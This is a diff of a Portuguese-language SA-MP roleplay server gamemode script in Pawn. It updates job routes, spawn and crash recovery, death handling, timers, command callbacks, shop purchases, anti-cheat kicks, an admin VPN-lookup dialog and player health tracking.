 			case 2: { SetPlayerCheckpoint(playerid, 1427.189086, -1663.609985, 13.109887, 5.0); RotaJob3[playerid]=3; }
@@ -7929,9 +7919,9 @@ public OnPlayerEnterCheckpoint(playerid)
 	else if(pInfo[playerid][Emprego] == 4 && cInfo[car][Type] == pInfo[playerid][Emprego])
 	{
 		DisablePlayerCheckpoint(playerid);
-		
+
 		// format(string, sizeof(string), "Rotajob4: %d", RotaJob4[playerid]); SendClientMessage(playerid, -1, string);
-		
+
 		switch(RotaJob4[playerid]) // TRANS PRODUTOS
 		{
 			case 2: { SetPlayerCheckpoint(playerid, 1799.806640, -1733.743041, 13.113720, 5.0); RotaJob4[playerid]=3; }
@@ -7970,13 +7960,13 @@ public OnPlayerEnterCheckpoint(playerid)
 			case 35: { AcabarRota(playerid); RotaJob4[playerid]=0; DisablePlayerCheckpoint(playerid); }
 		}
 	}
-	
+
 	else if(pInfo[playerid][Emprego] == 5 && cInfo[car][Type] == pInfo[playerid][Emprego])
 	{
 		DisablePlayerCheckpoint(playerid);
-		
+
 		// format(string, sizeof(string), "Rotajob5: %d", RotaJob5[playerid]); SendClientMessage(playerid, -1, string);
-		
+
 		switch(RotaJob5[playerid]) // CIMENTEIRO
 		{
 			case 2: { SetPlayerCheckpoint(playerid, 1195.509643, -2442.941650, 9.548927, 5.0); RotaJob5[playerid]=3; }
@@ -8011,13 +8001,13 @@ public OnPlayerEnterCheckpoint(playerid)
 			case 31: { AcabarRota(playerid); RotaJob5[playerid]=0; DisablePlayerCheckpoint(playerid); }
 		}
 	}
-	
+
 	else if(pInfo[playerid][Emprego] == 6 && cInfo[car][Type] == pInfo[playerid][Emprego])
 	{
 		DisablePlayerCheckpoint(playerid);
-		
+
 		// format(string, sizeof(string), "Rotajob6: %d", RotaJob6[playerid]); SendClientMessage(playerid, -1, string);
-		
+
 		switch(RotaJob6[playerid]) // LIMPA RUAS
 		{
 			case 2: { SetPlayerCheckpoint(playerid, 1442.434082, -1869.808349, 13.117640, 5.0); RotaJob6[playerid]=3; }
@@ -8043,9 +8033,9 @@ public OnPlayerEnterCheckpoint(playerid)
 	else if(pInfo[playerid][Emprego] == 7 && cInfo[car][Type] == pInfo[playerid][Emprego])
 	{
 		DisablePlayerCheckpoint(playerid);
-		
+
 		// format(string, sizeof(string), "Rotajob7: %d", RotaJob7[playerid]); SendClientMessage(playerid, -1, string);
-		
+
 		switch(RotaJob7[playerid]) // Lenhador
 		{
 			case 2: { SetPlayerCheckpoint(playerid, 1470.919677, -2234.405517, 13.109879, 5.0); RotaJob7[playerid]=3; }
@@ -8081,7 +8071,7 @@ public OnPlayerEnterCheckpoint(playerid)
 	else if(pInfo[playerid][Emprego] == 8 && cInfo[car][Type] == pInfo[playerid][Emprego])
 	{
 		DisablePlayerCheckpoint(playerid);
-		
+
 		// format(string, sizeof(string), "Rotajob8: %d", RotaJob8[playerid]); SendClientMessage(playerid, -1, string);
 
 		switch(RotaJob8[playerid]) // Trans Gasolina
@@ -8134,7 +8124,7 @@ public OnPlayerEnterCheckpoint(playerid)
 	else if(pInfo[playerid][Emprego] == 9 && cInfo[car][Type] == pInfo[playerid][Emprego])
 	{
 		DisablePlayerCheckpoint(playerid);
-		
+
 		// format(string, sizeof(string), "Rotajob9: %d", RotaJob9[playerid]); SendClientMessage(playerid, -1, string);
 
 		switch(RotaJob9[playerid]) // Trans Dinheiro
@@ -8270,7 +8260,7 @@ public Meteo(meteoid)
 public CarregarPlayerTextDraws(playerid)
 {
 	// VELOCIMETRO
-	
+
 	TDEditor_PTD[playerid][0] = CreatePlayerTextDraw(playerid, 540.666931, 348.459655, "000");
 	PlayerTextDrawLetterSize(playerid, TDEditor_PTD[playerid][0], 0.265666, 1.139554);
 	PlayerTextDrawAlignment(playerid, TDEditor_PTD[playerid][0], 1);
@@ -8325,17 +8315,32 @@ public CarregarPlayerTextDraws(playerid)
 	PlayerTextDrawFont(playerid, TDEditor_PTD[playerid][4], 1);
 	PlayerTextDrawSetProportional(playerid, TDEditor_PTD[playerid][4], 1);
 	PlayerTextDrawSetShadow(playerid, TDEditor_PTD[playerid][4], 0);
-	
+
 	return 1;
 }
 
 public SpawnarJogador(playerid)
 {
 	new suid[32];
-	
+
 	SetPlayerInterior(playerid, 0);
-	
-	if(pInfo[playerid][Faction] == 0 && pInfo[playerid][ChaveCasa] == 0 && pInfo[playerid][ChaveCasaAlugada] == 0 && pInfo[playerid][SpawnX] == 0)
+
+	if(pInfo[playerid][Crashou] == 1)
+	{
+		SetSpawnInfo(playerid, 0, pInfo[playerid][Skin], pInfo[playerid][SpawnX], pInfo[playerid][SpawnY], pInfo[playerid][SpawnZ], 0.000, 0, 0, 0, 0, 0, 0);
+		SetPlayerVirtualWorld(playerid, pInfo[playerid][SpawnVirtualWorld]);
+		SetPlayerInterior(playerid, pInfo[playerid][SpawnInterior]);
+
+		SendClientMessage(playerid, COLOR_INFO, "[CRASH:] {FFFFFF}Crashaste e voltaste à posição onde estavas");
+
+		pInfo[playerid][SpawnX] = 0;
+		pInfo[playerid][SpawnY] = 0;
+		pInfo[playerid][SpawnZ] = 0;
+		pInfo[playerid][SpawnVirtualWorld] = 0;
+		pInfo[playerid][SpawnInterior] = 0;
+		pInfo[playerid][Crashou] = 0;
+	}
+	else if(pInfo[playerid][Faction] == 0 && pInfo[playerid][ChaveCasa] == 0 && pInfo[playerid][ChaveCasaAlugada] == 0)
 	{
 		SetSpawnInfo(playerid, 0, pInfo[playerid][Skin], SpawnInfo[pInfo[playerid][Origem]][X], SpawnInfo[pInfo[playerid][Origem]][Y], SpawnInfo[pInfo[playerid][Origem]][Z], SpawnInfo[pInfo[playerid][Origem]][A], 0, 0, 0, 0, 0, 0);
 		SetPlayerVirtualWorld(playerid, 0);
@@ -8344,7 +8349,7 @@ public SpawnarJogador(playerid)
 	else if(pInfo[playerid][Faction] != 0)
 	{
 		SetSpawnInfo(playerid, 0, pInfo[playerid][Skin], fInfo[pInfo[playerid][Faction]][X], fInfo[pInfo[playerid][Faction]][Y], fInfo[pInfo[playerid][Faction]][Z], fInfo[pInfo[playerid][Faction]][A], 0, 0, 0, 0, 0, 0);
-		SetPlayerVirtualWorld(playerid, 0); 
+		SetPlayerVirtualWorld(playerid, 0);
 		SetPlayerInterior(playerid, 0);
 	}
 	else if(pInfo[playerid][ChaveCasa] != 0)
@@ -8359,23 +8364,17 @@ public SpawnarJogador(playerid)
 		SetPlayerVirtualWorld(playerid, hInfo[pInfo[playerid][ChaveCasaAlugada]][VirtualWorld]);
 		SetPlayerInterior(playerid, hInfo[pInfo[playerid][ChaveCasaAlugada]][Interior]);
 	}
-	else if(pInfo[playerid][SpawnX] != 0)
-	{
-		SetSpawnInfo(playerid, 0, pInfo[playerid][Skin], SpawnInfo[pInfo[playerid][Origem]][X], SpawnInfo[pInfo[playerid][Origem]][Y], SpawnInfo[pInfo[playerid][Origem]][Z], SpawnInfo[pInfo[playerid][Origem]][A], 0, 0, 0, 0, 0, 0);
-		SetPlayerVirtualWorld(playerid, 0);
-		SetPlayerInterior(playerid, 0);
-	}
-	
+
 	ResetPlayerMoney(playerid);
-	
+
 	SetPlayerScore(playerid, pInfo[playerid][Level]);
 	GivePlayerMoney(playerid, GetPlayerMoneyEx(playerid));
  	SetPlayerColor(playerid, COLOR_WHITE);
 
  	StopAudioStreamForPlayer(playerid);
- 	
+
  	Logged[playerid] = true;
-	
+
     TogglePlayerSpectating(playerid, false);
 
  	if(pInfo[playerid][Admin] > 0)
@@ -8391,16 +8390,11 @@ public SpawnarJogador(playerid)
 	    {
 			switch(i)
 			{
-			    case 0,1,2,3,4,5,6,18,59: { continue; }
+			    case 0,1,2,3,4,5,6,18,49,59: { continue; }
 			}
-			
+
 			EnableAntiCheatForPlayer(playerid, i, 1);
 		}
-	}
-
-	if(pInfo[playerid][Morto] == 1)
-	{
-	    Morte(playerid);
 	}
 
 	PlayerPlaySound(playerid, 1186, 0.0, 0.0, 10.0);
@@ -8418,7 +8412,7 @@ public SpawnarJogador(playerid)
 		format(string, sizeof(string), "\n{FFFFFF}Este é um pormenor importante do qual te deves sempre lembrar."); strcat(sdialog,string);
 
 		UnlockTutorial[playerid] = false;
-		SetTimerEx("UnlockTutorials", 10000, false, "i", playerid);
+		SetPlayerTimer(playerid, "UnlockTutorials", 10000, false);
 
 		return ShowPlayerDialog(playerid, DIALOG_TUTORIAL1, DIALOG_STYLE_MSGBOX, "TUTORIAL - Em que consiste o servidor", sdialog, "Próximo", "Sair");
 	}
@@ -8444,34 +8438,44 @@ public SpawnarJogador(playerid)
 
 	if(TimerGuardarJogador[playerid] == -1)
 	{
-		TimerGuardarJogador[playerid] = SetTimerEx("GuardarJogador", 120000, true, "i", playerid);
-		TimerUpdateJogador[playerid] = SetTimerEx("UpdateJogador", 1000, true, "i", playerid);
+		TimerGuardarJogador[playerid] = SetPlayerTimer(playerid, "GuardarJogador", 120000, true);
+		TimerUpdateJogador[playerid] = SetPlayerTimer(playerid, "UpdateJogador", 1000, true);
 	}
 
 	format(suid, sizeof(suid), "{FF0000}[ {FF9900}%d {FF0000}]", pInfo[playerid][UID]);
 	UIDLabel[playerid] = Create3DTextLabel(suid, COLOR_WHITE, 0, 0, 0, 70.0, 0, 1);
 	Attach3DTextLabelToPlayer(UIDLabel[playerid], playerid, 0.0, 0.0, 0.5);
-	
+
 	SpawnPlayer(playerid);
-	
+
 	if(pInfo[playerid][Morto] == 1)
 	{
-	    Morte(playerid);
+	    if(pInfo[playerid][MorteX] == 0 && pInfo[playerid][MorteY] == 0 && pInfo[playerid][MorteZ] == 0)
+		{
+		    pInfo[playerid][Morto] = 0;
+		    pInfo[playerid][MorteX] = 0;
+		    pInfo[playerid][MorteY] = 0;
+		    pInfo[playerid][MorteZ] = 0;
+		}
+		else
+		{
+		    Morte(playerid);
+		}
 	}
-	
+
 	return 1;
 }
 
 public MenosDrunk(playerid)
 {
     DrunkLevel[playerid]--;
-    
+
 	if(DrunkLevel[playerid] == 0)
 	{
 		KillTimer(TimerDrunk[playerid]);
 		SetPlayerDrunkLevel(playerid, 0);
 	}
-	
+
 	return 1;
 }
 
@@ -8537,14 +8541,14 @@ public OnCheatDetected(playerid, ip_address[], type, code)
 		    case 51: { cheat = "Anti DDoS"; }
 		    case 52: { cheat = "Anti NOP's"; }
 		}
-		
+
 		format(string, sizeof(string), "%s", cheat);
-		
+
 		HackLog(playerid, string);
-		
+
 		return KickPlayer(playerid, "Doge", string);
 	}
-	
+
 	return 1;
 }
 
@@ -8561,14 +8565,13 @@ public RotaMensagem(playerid, msg[])
 public PausarRota(playerid, msg[], ms)
 {
 	new string[128];
-	
+
 	format(string, sizeof(string), "%s.", msg);
     PlayerActionMessage(playerid, 15.0, string);
-    
+
     TogglePlayerControllable(playerid, false);
-    
-    SetTimerEx("DespausarRota", ms, false, "i", playerid);
-    
+    SetPlayerTimer(playerid, "DespausarRota", ms, false);
+
 	return 1;
 }
 
@@ -8577,16 +8580,16 @@ public DespausarRota(playerid)
     PlayerActionMessage(playerid, 15.0, "segue viagem.");
 
     TogglePlayerControllable(playerid, true);
-    
+
 	return 1;
 }
 
-public Streamer_OnPluginError(error[])
+/*public Streamer_OnPluginError(error[])
 {
     ErrorLog(error);
-    
+
 	return 1;
-}
+}*/
 
 public OnMenuResponse(playerid, menuid, response, listitem)
 {
@@ -8647,14 +8650,14 @@ public OnMenuResponse(playerid, menuid, response, listitem)
 			    }
 			}
 			TogglePlayerControllable(playerid, true);
-			
+
 			format(string, sizeof(string), "Nome da Arma: {FFFFFF}%s", nome);
 			SendClientMessage(playerid, COLOR_CHAT, string);
 			format(string, sizeof(string), "Preço: {FFFFFF}%d$", price);
 			SendClientMessage(playerid, COLOR_CHAT, string);
 		}
 	}
-	
+
 	return 1;
 }
 
@@ -8664,7 +8667,7 @@ public CarregarMenus()
 	new tick2;
 
 	tick1 = GetTickCount();
-	
+
     MenuArmas = Menu_Create("Armas", COLOR_ORANGE);
     Menu_AddItem(MenuArmas, "Faca");
     Menu_AddItem(MenuArmas, "Katana");
@@ -8675,27 +8678,27 @@ public CarregarMenus()
 	Menu_AddItem(MenuArmas, "MP5");
 	Menu_AddItem(MenuArmas, "Kalashnikov AK-47");
 	Menu_AddItem(MenuArmas, "Gas Pimenta");
-	
+
 	tick2 = GetTickCount();
-    printf("\n [PC:RP] Menus carregados (%d ms)", tick2-tick1);
-    
+    printf(" [PC:RP] Menus carregados (%d ms)", tick2-tick1);
+
 	return 1;
 }
 
-public OnPlayerCommandReceived(playerid,cmdtext[]) // This callback is called before the actual command function is called.
+public OnPlayerCommandReceived(playerid, cmd[], params[], flags) // This callback is called before the actual command function is called.
 {
 	Tickbefore[playerid] = GetTickCount();
-    
-	return CMD_SUCCESS;
+
+	return 1;
 }
 
-public OnPlayerCommandPerformed(playerid, cmdtext[], success) // This callback is called after the command function is executed.
+public OnPlayerCommandPerformed(playerid, cmd[], params[], result, flags) // This callback is called after the command function is executed.
 {
-	if(success != CMD_SUCCESS)
+	if(result == -1)
     {
     	new stringcmd[128];
 
-        format(stringcmd, sizeof(stringcmd), "[ERRO:] {FFFFFF}O comando {AA3333}%s {FFFFFF}não existe.", cmdtext);
+        format(stringcmd, sizeof(stringcmd), "[ERRO:] {FFFFFF}O comando {AA3333}%s {FFFFFF}não existe.", cmd);
         SendClientMessage(playerid, COLOR_ERRO, stringcmd);
     }
     else
@@ -8703,15 +8706,15 @@ public OnPlayerCommandPerformed(playerid, cmdtext[], success) // This callback i
 	    sStats[0][Comandos]++;
 	}
 
-	CMDLog(playerid, cmdtext);
-	
+	CMDLog(playerid, cmd);
+
 	Tickafter[playerid] = GetTickCount();
-	
+
 	if(Tickbefore[playerid] <= Tickafter[playerid] && Tickafter[playerid]-Tickbefore[playerid] < 5000)
 	{
 		TickTotal += Tickafter[playerid]-Tickbefore[playerid];
 		TickCount++;
-		
+
 		if(DebugStatus[playerid] == true)
 		{
 			new stringcmd[128];
@@ -8720,8 +8723,8 @@ public OnPlayerCommandPerformed(playerid, cmdtext[], success) // This callback i
 			SendClientMessage(playerid, COLOR_RED, stringcmd);
 		}
 	}
-	
-    return CMD_SUCCESS;
+
+    return 1;
 }
 
 public OnPlayerModelSelection(playerid, response, listid, modelid)
@@ -8730,22 +8733,22 @@ public OnPlayerModelSelection(playerid, response, listid, modelid)
 	{
 	    if(!response) return 1;
 	    if(GetPlayerMoneyEx(playerid) < PRECO_SKIN) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-	    
+
 		pInfo[playerid][Skin] = modelid;
 		SetPlayerSkin(playerid, modelid);
 		GivePlayerMoneyEx(playerid, -PRECO_SKIN);
-		
+
 		PlayerActionMessage(playerid, 15.0, "escolhe uma roupa e compra-a.");
-		
-		ApplyActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
+
+		ApplyDynamicActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
 	}
 	if(listid == ListaAcessorios)
 	{
 	    if(!response) return 1;
 	    if(GetPlayerMoneyEx(playerid) < PRECO_ACESSORIO) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-	    
-	    ApplyActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
-	    
+
+	    ApplyDynamicActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
+
 	    switch(modelid)
 	    {
 			case 2054:
@@ -8882,10 +8885,10 @@ public OnPlayerModelSelection(playerid, response, listid, modelid)
 	    if(!response) return 1;
 	    new price = GetObjectPrice(modelid);
 	    new string[128];
-	    
+
 	    if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-	    
-	    ApplyActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
+
+	    ApplyDynamicActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
 
 		switch(modelid)
 		{
@@ -8902,25 +8905,25 @@ public OnPlayerModelSelection(playerid, response, listid, modelid)
 			case 18976: { pObjects[playerid][Capacete] = 1; format(string, sizeof(string), "Compraste %s por %d$", GetObjectName(modelid), price); }
 			case 18632: { pObjects[playerid][CanaDePesca] = 1; format(string, sizeof(string), "Compraste %s por %d$", GetObjectName(modelid), price); }
 		}
-		
+
 		GivePlayerMoneyEx(playerid, -price);
-		
+
 		SendClientMessage(playerid, COLOR_INFO, string);
 
 		PlayerActionMessage(playerid, 15.0, "escolhe um objeto e compra-o.");
-		
-        ApplyActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
+
+        ApplyDynamicActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
 	}
 	if(listid == ListaCarros)
 	{
 	    if(!response) return 1;
 	    new nome[32];
 		new price = GetStandPrice(modelid);
-		
+
 		nome  = GetStandName(modelid);
-		
+
 		new string[128];
-		
+
 		format(string, sizeof(string), "Nome do veículo: {FFFFFF}%s", nome);
 		SendClientMessage(playerid, COLOR_CHAT, string);
 		format(string, sizeof(string), "Preço: {FFFFFF}%d$", price);
@@ -8931,7 +8934,7 @@ public OnPlayerModelSelection(playerid, response, listid, modelid)
 	    if(!response) return 1;
 	    new price = GetStandPrice(modelid);
 	    new string[128];
-	    
+
 		if(pInfo[playerid][ChaveCarro1] == 0 || pInfo[playerid][ChaveCarro2] == 0 || pInfo[playerid][ChaveCarro3] == 0 || pInfo[playerid][ChaveCarro4] == 0)
 		{
   			if(pInfo[playerid][Golds] > 0)
@@ -8942,7 +8945,7 @@ public OnPlayerModelSelection(playerid, response, listid, modelid)
 			{
 			    if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 			}
-  			
+
 		    for(new c = 0; c < MAX_CARROS; c++)
 			{
 				new model = GetVehicleModel(c);
@@ -8970,7 +8973,7 @@ public OnPlayerModelSelection(playerid, response, listid, modelid)
 			    cInfo[c][Color1] = 1;
 			    cInfo[c][Comprado] = 1;
                 format(cInfo[c][Prop], 32, "%s", GetPlayerNameEx(playerid));
-                format(cInfo[c][CompradoEm], 32, "%s", GetCurrentDate());
+                format(cInfo[c][CompradoEm], 32, "%s", GetDate());
 				cInfo[c][Travao] = 0;
 				cInfo[c][Kilometros] = 0;
 				cInfo[c][Metros] = 0;
@@ -9002,13 +9005,12 @@ public OnPlayerModelSelection(playerid, response, listid, modelid)
 
 			    GuardarCarro(c);
 			    DestroyVehicle(cInfo[c][ID]);
-			    
 			    IsARespawn[c] = true;
 				cInfo[c][ID] = CreateVehicle(cInfo[c][Model], cInfo[c][X], cInfo[c][Y], cInfo[c][Z], cInfo[c][Angle], cInfo[c][Color1], cInfo[c][Color2], -1, IsACopCar(cInfo[c][Model]) ? 1 : 0);
 				SetVehicleVirtualWorld(cInfo[c][ID], cInfo[c][VirtualWorld]);
 				LinkVehicleToInterior(cInfo[c][ID], cInfo[c][Interior]);
 				AtualizarDanosCarro(c);
-	
+
 			    SetVehiclePosEx(cInfo[c][ID], STAND_X, STAND_Y, STAND_Z);
 
 				if(pInfo[playerid][Golds] > 0)
@@ -9023,7 +9025,7 @@ public OnPlayerModelSelection(playerid, response, listid, modelid)
 
 				format(string, sizeof(string), "Compraste o carro %d. Tira print desta mensagem por percaução.", c);
 				SendClientMessage(playerid, COLOR_INFO, string);
-				
+
 				sStats[0][CarrosComprados]++;
 
                 if(pInfo[playerid][ChaveCarro1] == 0)
@@ -9042,14 +9044,14 @@ public OnPlayerModelSelection(playerid, response, listid, modelid)
 				{
                     pInfo[playerid][ChaveCarro4] = c;
 				}
-				
+
 				if(modelid == 508 || modelid == 454) // caravana
 				{
 					for(new i = 0; i < MAX_CASAS; i++)
 					{
 					    if(i == 0) continue;
 					    if(hInfo[i][Price] != 0) continue;
-					    
+
 				    	hInfo[i][Comprada] = 1;
 						hInfo[i][Locked] = 0;
 						hInfo[i][PickupID] = 19133;
@@ -9065,7 +9067,7 @@ public OnPlayerModelSelection(playerid, response, listid, modelid)
 						hInfo[i][EnterInterior] = 0;
 
 					  	pInfo[playerid][ChaveCasa] = i;
-					  	
+
 					  	if(modelid == 508)
 					  	{
 						  	cInfo[c][IsCaravana] = 1;
@@ -9076,8 +9078,8 @@ public OnPlayerModelSelection(playerid, response, listid, modelid)
 							hInfo[i][ExitY] = -1714.5696;
 							hInfo[i][ExitZ] = -46.7258;
 							hInfo[i][Interior] = 0;
-							
-							return SendClientMessage(playerid, COLOR_INFO, "Compraste uma caravana. Para o pickup da casa aparecer, faz /estacionar em qualquer sítio.");
+
+							return SendClientMessage(playerid, COLOR_INFO, "Compraste uma caravana. Para a entrada da casa aparecer, faz /estacionar em qualquer sítio.");
 					  	}
 					  	else
 					  	{
@@ -9089,8 +9091,8 @@ public OnPlayerModelSelection(playerid, response, listid, modelid)
 							hInfo[i][ExitY] = 613.277405;
 							hInfo[i][ExitZ] = 2.310597;
 							hInfo[i][Interior] = 0;
-							
-							return SendClientMessage(playerid, COLOR_INFO, "Compraste um barco habitável. Para o pickup da casa aparecer, faz /estacionar em qualquer sítio.");
+
+							return SendClientMessage(playerid, COLOR_INFO, "Compraste um barco habitável. Para a entrada da casa aparecer, faz /estacionar em qualquer sítio.");
 					  	}
 					}
 				}
@@ -9114,10 +9116,10 @@ public HttpDox(index, response_code, data[])
         }
 
     	new output[13][64], sdialog[512];
-    	
+
     	new isVPN = strval(output[12]);
     	new vpnMessage[32];
-    	
+
     	switch(isVPN)
     	{
     	    case 0: format(vpnMessage, sizeof(vpnMessage), "{00FF00}Muito pouco provável");
@@ -9126,7 +9128,7 @@ public HttpDox(index, response_code, data[])
     	    case 3: format(vpnMessage, sizeof(vpnMessage), "{F7752F}Muito provável");
     	    case 4: format(vpnMessage, sizeof(vpnMessage), "{FF0000}Certo");
     	}
-    	
+
 		explode(output, data, "'");
 		format(sdialog, sizeof(sdialog),
 		"Index\tValor\n\
@@ -9148,12 +9150,25 @@ public HttpDox(index, response_code, data[])
     else
     {
         new string[256];
-		
+
   		format(string, sizeof(string), "[ERRO:] {FFFFFF}Erro ao obter informações sobre esse IP. (Código: %d) (%s)", response_code, data);
   		SendClientMessage(index, COLOR_ERRO, string);
     }
 
     return 1;
+}
+
+public VelocidadeCarta(playerid)
+{
+	switch(RotaConducao[playerid])
+	{
+		case 2: { if(GetPlayerSpeed(playerid) > 90) { SpeedWarning[playerid]++; } }
+		case 3: { if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
+		case 4: { if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
+		case 5: { if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
+	}
+
+	return 1;
 }
 
 public AddVehicleComponentEx(vehicleid, componentid)
@@ -9213,24 +9228,39 @@ public AddVehicleComponentEx(vehicleid, componentid)
 	    default:
 	    {
 			new string[128];
-			
+
 			format(string, sizeof(string), "[Erro Tunning:] CarID: %d - ComponentID: %d", vehicleid, componentid);
 	        ErrorLog(string);
 	    }
 	}
 	GuardarCarro(vehicleid);
-	
+
 	return 1;
+}
+
+public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
+{
+	if(pInfo[playerid][Admin] > 0 && AdminDuty[playerid] == true)
+	{
+	    new string[128];
+
+	    SetPlayerPosFindZ(playerid, fX, fY, fZ);
+
+	    format(string, sizeof(string), "Foste teletransportado para (%f, %f, %f)", fX, fY, fZ);
+	    SendClientMessage(playerid, COLOR_CHAT, string);
+	}
+
+    return 1;
 }
 
 public Relogio()
 {
     new Hour, Minute, Second, timestring[32];
-    
+
 	gettime(Hour, Minute, Second);
 	format(timestring, sizeof(timestring), "%02d:%02d:%02d", Hour, Minute, Second);
 	TextDrawSetString(relogio, timestring);
-	
+
 	if(HoraAntiga == -1)
 	{
 	    HoraAntiga = Hour;
@@ -9238,51 +9268,51 @@ public Relogio()
 	if(HoraAntiga != Hour)
 	{
 		Euromilhoes();
-		
+
 		RespawnCounter = 1;
-		TimerRespawn = SetTimer("RespawnGeral", 1000, true);
-		
+		SetTimer_("RespawnGeral", 1000, TIMER_NODELAY, TIMER_INFINITO);
+
 		HoraAntiga = Hour;
 	}
-	
+
 	MeteoSegundos++;
-	
+
 	if(MeteoSegundos == 60)
 	{
 	    MeteoSegundos = 0;
 	    MeteoMinutos++;
-	    
+
 	    if(MeteoMinutos == 60)
 	    {
 	        MeteoMinutos = 0;
 	        SetWorldTime(Hour);
-	        
+
         	new rand = random(21);
 
 			Meteo(rand);
 	    }
 	}
-	
+
 	UptimeSegundos++;
-	
+
 	if(UptimeSegundos == 60)
 	{
 	    UptimeSegundos = 0;
 	    UptimeMinutos++;
-	    
+
 		if(UptimeMinutos == 60)
 		{
 		    UptimeMinutos = 0;
 		    UptimeHoras++;
 		}
-		
+
 		if(UptimeHoras == 24)
 		{
 			UptimeHoras = 0;
 			UptimeDias++;
 		}
 	}
-	
+
 	return 1;
 }
 
@@ -9291,34 +9321,47 @@ public UpdateJogador(playerid)
 	Tickbefore_Update[playerid] = GetTickCount();
 
 	new string[128];
-	
 	new ping = GetPlayerPing(playerid);
-	
 	new Float:health, Float:armour;
+
 	GetPlayerHealth(playerid, health);
 	GetPlayerArmour(playerid, armour);
-	
-	pInfo[playerid][Vida] = health;
-	pInfo[playerid][Colete] = armour;
-	
-	if(health > 100 && pInfo[playerid][Morto] == 0 && AdminDuty[playerid] == false)
+
+	if(pInfo[playerid][Morto] == 0)
 	{
-	    SetPlayerHealth(playerid, 50);
-		pInfo[playerid][Vida] = 50;
+	    if(health != pInfo[playerid][Vida])
+	    {
+	        SetPlayerHealthEx(playerid, pInfo[playerid][Vida], HEALTH_SET);
+	    }
 	}
-	
+	else
+	{
+	    if(!IsPlayerInRangeOfPoint(playerid, 2.0, pInfo[playerid][MorteX], pInfo[playerid][MorteY], pInfo[playerid][MorteZ])) // não tá no sitio que é suposto
+	    {
+	        SetPlayerPosEx(playerid, pInfo[playerid][MorteX], pInfo[playerid][MorteY], pInfo[playerid][MorteZ], pInfo[playerid][MorteVirtualWorld], pInfo[playerid][MorteInterior]);
+		    GameTextForPlayer(playerid,"~r~ Gravemente Ferido", 15000, 5);
+			SetPlayerTimer(playerid, "AnimMorteAtualizar", 500, false);
+	    }
+
+	}
+
+	if(health > 100 && pInfo[playerid][Morto] == 0 && AdminDuty[playerid] == false) // provavelmente tá a xitar
+	{
+	    SetPlayerHealthEx(playerid, 50, HEALTH_SET);
+	}
+
 	PingTotal += ping;
 	PingCount++;
-	
+
 	Segundos[playerid]++;
 
-	if(Segundos[playerid] >= 60 && Segundos[playerid] <= 62)
+	if(Segundos[playerid] == 60)
 	{
 	    sStats[0][MinutesPlayed]++;
-	    
+
 		pInfo[playerid][Minutos]++;
 		Segundos[playerid] = 0;
-		
+
 		if(AdminDuty[playerid] == false)
 		{
 	        new suid[32];
@@ -9331,7 +9374,7 @@ public UpdateJogador(playerid)
 		else
 		{
 		    Delete3DTextLabel(DutyLabel[playerid]);
-		    
+
  			switch(pInfo[playerid][Admin])
 			{
 			    case 1,2:
@@ -9358,17 +9401,17 @@ public UpdateJogador(playerid)
 				}
 			}
 		}
-		
+
 		if(pInfo[playerid][TempoRota] != 0)
 		{
 		    pInfo[playerid][TempoRota]--;
-		    
+
 		    if(pInfo[playerid][TempoRota] == 0)
 		    {
 		        SendClientMessage(playerid, COLOR_INFO, "[Centro De Emprego:] {FFFFFF}Já podes ir trabalhar.");
 		    }
 		}
-		
+
  		if(pInfo[playerid][Admin] == 0 && pInfo[playerid][Jailed] == 0 && pInfo[playerid][Preso] == 0)
 		{
 			if(IsPlayerInRangeOfPoint(playerid, 5.0, AntiAFK_X[playerid], AntiAFK_Y[playerid], AntiAFK_Z[playerid]) && AntiAFK_X[playerid] != 0 && AntiAFK_Y[playerid] != 0)
@@ -9381,38 +9424,32 @@ public UpdateJogador(playerid)
 			    AFKWarning[playerid] = 0;
 			}
 		}
-		
+
 		if(AFKWarning[playerid] == 5 || AFKWarning[playerid] == 10 || AFKWarning[playerid] > 15)
 		{
-			foreach(new i : Player)
-			{
-				// if(!IsPlayerConnected(i)) continue;
-				if(AdminDuty[i] == false) continue;
-
-				format(string, sizeof(string), "[ANTI-AFK:] {FFFFFF}O jogador %s (ID:%d) pode estar AFK!", GetPlayerNameEx(playerid), playerid);
-				SendClientMessage(i, COLOR_OWNER, string);
-			}
+		    format(string, sizeof(string), "[ANTI-AFK:] {FFFFFF}O jogador %s (ID:%d) pode estar AFK!", GetPlayerNameEx(playerid), playerid);
+		    SendAdminMessage(string);
 		}
-		
+
 		if(pInfo[playerid][Viciado] == 1)
 		{
 		    pInfo[playerid][TempoViciado]++;
-		    
+
 		    if(pInfo[playerid][TempoViciado] == 60)
 		    {
-				SetPlayerHealthEx(playerid, 10, 2);
+				SetPlayerHealthEx(playerid, 10, HEALTH_REMOVE);
 		    }
 		    else if(pInfo[playerid][TempoViciado] == 120)
 		    {
-				SetPlayerHealthEx(playerid, 30, 2);
+				SetPlayerHealthEx(playerid, 30, HEALTH_REMOVE);
 		    }
 		    else if(pInfo[playerid][TempoViciado] == 180)
 		    {
